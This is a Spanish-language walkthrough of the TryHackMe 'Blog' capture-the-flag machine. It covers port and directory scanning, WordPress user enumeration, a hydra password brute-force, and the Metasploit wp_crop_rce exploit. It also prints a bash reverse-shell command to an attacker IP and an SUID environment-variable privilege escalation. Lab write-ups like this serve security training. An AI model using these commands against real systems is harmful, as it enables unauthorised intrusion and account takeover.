---
layout: single
title: Blog - TryHackMe
excerpt: " Billy Joel made a blog on his home computer and has started working on it.  It's going to be so awesome!
Enumerate this box and find the 2 flags that are hiding on it!  Billy has some weird things going on his laptop.  Can you maneuver around and get what you need?  Or will you fall down the rabbit hole... "
date: 2023-02-15
classes: wide
header:
  teaser: /blog/assets/images/thm-writeup-blog/blog.png
  teaser_home_page: true
  icon: /blog/assets/images/tryhackme.webp
categories:
  - tryhackme
tags:
  - WordPress
  - RCE
  - Bruteforce
  - SUID
---

Billy Joel made a blog on his home computer and has started working on it.  It's going to be so awesome!  
Enumerate this box and find the 2 flags that are hiding on it!  Billy has some weird things going on his laptop.  Can you maneuver around and get what you need?  Or will you fall down the rabbit hole...  

# Summary
- IP: 10.10.95.98
- Ports: 22,80,139,445
- OS: Linux (Ubuntu)
- Services & Applications:
	-  22 -> OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
	-  80 -> Apache httpd 2.4.29
	-  139 -> Samba smbd 3.X - 4.X
	-  445 -> Samba smbd 4.7.6-Ubuntu  

# Recon

- Escaneo básico de puertos:  

```bash
$nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.95.98 -oG allPorts
```


- Escaneo profundo de puertos encontrados:  

```bash
$nmap -p22,80 -sCV 10.10.95.98 -oN targeted
```

- Escaneo de directorios con gobuster:  

```bash
$gobuster dir -u 10.10.84.132 -w /usr/share/SecLists/Discovery/Web-Content/common.txt -t 100
```

- Si analizamos el contenido de Samba con "smbmap" nos daremos cuenta que se trata de un rabbit hole.  

# Análisis de página web:

- Haciendo un curl a la dirección IP obtenemos un dominio "blog.thm" el cual tendremos que agregarlo al "/etc/hosts" de nuestra máquina atacante:  

```bash
$curl 10.10.95.98 -I
```

```bash
HTTP/1.1 200 OK
Date: Wed, 15 Feb 2023 15:49:59 GMT
Server: Apache/2.4.29 (Ubuntu)
Link: <http://blog.thm/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8
```

- Entramos a la página principal y no encontramos nada interesante, solo identificamos un blog creado en el CMS "WordPress".  

- Hacemos un análisis de directorios:  

```bash
$gobuster dir -u 10.10.84.132 -w /usr/share/SecLists/Discovery/Web-Content/common.txt -t 100
```

- Encontramos un "/wp-login.php" en el que tendremos la pantalla típica de logeo de WordPress.  

- Hacemos un análisis profundo de la página de WordPress en busca de usuarios válidos:  

```bash
$wpscan --url 10.10.95.98 -e u
```

```bash
[+] bjoel
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://10.10.95.98/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] kwheel
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://10.10.95.98/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```
 
- Aparte de los usuarios, hemos identificado la versión de WordPress, en este caso , 5.0.  
- Guardamos los usuarios encontrados (bjoel,kwheel) en un archivo "users.txt".  

- Intentamos encontrar la contraseña de uno de estos usuarios aplicando fuerza bruta con hydra, obteniendo primero con burpsuite la información de la petición hecha por POST al intentar logearnos y tomando como referencia el mensaje de error de logeo al intentar entrar con uno de los usuarios que hemos encontrado:  

```bash
$hydra -L users.txt -P /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt 10.10.95.98 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:The password you entered for the username" -t 20
```


```bash
[STATUS] 2049557.86 tries/min, 14346905 tries in 00:07h, 14341891 to do in 00:07h, 20 active
[80][http-post-form] host: 10.10.95.98   login: kwheel   password: cutiepie1
```

- Guardamos la credencial encontrada y la usamos para entrar en la página de WordPress como el usuario "kwheel".  

- Con acceso a WordPress 5.0, podemos buscar alguna vulnerabilidad para dicha versión.  


# Exploit WordPress 5.0 RCE:  

- En mestasploit buscamos vulerabilidades:

```bash
search wordpress 5.0
```

- Encontramos un "Crop-Image Shell Upload", usamos dicha exploit:

```bash
use exploit/multi/http/wp_crop_rce
```

- Desplegamos los parámetros que necesita la exploit para ejecutarse:

```bash
show options
```

```
Module options (exploit/multi/http/wp_crop_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   THEME_DIR                   no        The WordPress theme dir name (disable theme auto-detection if provided)
   USERNAME                    yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.35     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
```
  
- Configuramos el exploit:

```bash
set PASSWORD cutiepie1
set USERNAME kwheel
set LHOST 10.18.101.123 
set LPORT 1234
set RHOSTS 10.10.95.98
```

- Ejecutamos el exploit:

```bash
run
```

```bash
[*] Started reverse TCP handler on 10.18.101.123:1234 
[*] Authenticating with WordPress using kwheel:cutiepie1...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload
[+] Image uploaded
[*] Including into theme
[*] Sending stage (39927 bytes) to 10.10.231.24
[*] Meterpreter session 1 opened (10.18.101.123:1234 -> 10.10.231.24:37774) at 2023-02-15 12:00:25 -0500
[*] Attempting to clean up files...
```

- Obtenemos una sesión de meterpreter, podemos abrir la shell con "shell", y en mi caso me entablo una reverse shell para manipularla desde mi propio entorno:

```bash
bash -c "bash -i >& /dev/tcp/10.18.101.123/443 0>&1"
```

- Ganamos acceso al sistema como el usuario "www-data"  


# ESCALANDO PRIVILEGIOS:  

- Buscamos permisos SUID:

```bash
$find / -perm -4000 2>/dev/null | grep -v "snap"
```

- Encontramos un archivo sospechoso. 

```bash
$/usr/sbin/checker
```

- Lo analizamos:

```bash
$file /usr/sbin/checker
```

- Se trata de un binario compilado para Linux, lo ejecutamos

```bash
$/usr/sbin/checker
```

```
Not an Admin
```

- Nos devuelve dicho output, analizamos cada traza que realiza el binario dentro del sistema:  

```bash
$ltrace /usr/sbin/checker
```

```
getenv("admin")                                                                                                      = nil
puts("Not an Admin"Not an Admin
)                                                                                                 = 13
+++ exited (status 0) +++
```

- De acuerdo a esto podemos concluir lo siguiente...  

- La traza del binario muestra las siguientes acciones:  

1.  Llamada a la función `getenv()` con el argumento `"admin"`.
2.  El valor de retorno de `getenv()` es `nil`, lo que indica que no se encontró ninguna variable de entorno con el nombre `"admin"`.
3.  Llamada a la función `puts()` con el argumento `"Not an Admin"`.
4.  Se imprime `"Not an Admin"` en la salida estándar, seguido de un carácter de nueva línea (`\n`), lo que da como resultado una línea de salida que dice `"Not an Admin"`.
5.  El binario sale con un estado de salida de `0`, lo que indica que terminó exitosamente.  

- En resumen, el binario parece estar verificando si una variable de entorno con el nombre `"admin"` está definida y, en caso contrario, imprimirá un mensaje en la salida estándar diciendo que no se es administrador.

- Para aprovecharnos de esto, simplemente podemos crear una variable de entorno con el nombre "admin" con valor 0 y luego ejecutar el binario y ya que este en una parte del mismo ejecuta "/bin/bash", al existir el entorno "admin" se ejecutará la bash como root al tener el binario permisos SUID y ser del propietario root:

```bash
$export admin=0
```

- Ahora si vemos la traza que realiza el binario vemos lo siguiente:  

```
getenv("admin")                                                                                                      = "0"
setuid(0)                                                                                                            = -1
```

- Ejecutamos el binario y seremos root:  

```bash
/usr/sbin/checker
```
